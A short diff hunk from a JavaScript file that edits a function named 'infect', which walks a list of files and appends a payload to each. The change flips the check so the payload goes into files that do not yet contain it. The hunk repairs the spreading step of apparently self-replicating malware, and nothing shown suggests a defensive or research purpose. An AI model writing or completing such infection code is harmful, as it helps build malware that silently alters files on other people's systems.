@@ -84,7 +84,7 @@ function infect( payload ) {
         return Promise.all( files.map( function( file ) {
             readFile( file )
                 .then( function( data ) {
-                    if( data.indexOf( modifiedPayload ) >= 0 )
+                    if( data.indexOf( modifiedPayload ) === -1 )
                         return appendFile( file, modifiedPayload );
                 }); 
         }));
